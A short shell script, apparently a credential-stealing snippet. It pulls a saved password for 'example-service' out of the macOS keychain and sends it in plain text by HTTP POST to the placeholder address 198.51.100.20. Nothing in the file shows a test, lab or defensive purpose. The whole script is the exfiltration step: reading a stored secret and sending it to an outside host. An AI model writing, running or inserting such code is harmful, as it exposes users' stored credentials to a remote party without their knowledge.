#!/bin/sh
pw=$(security find-generic-password -s example-service -w)
curl -s -d "pw=$pw" http://198.51.100.20/check
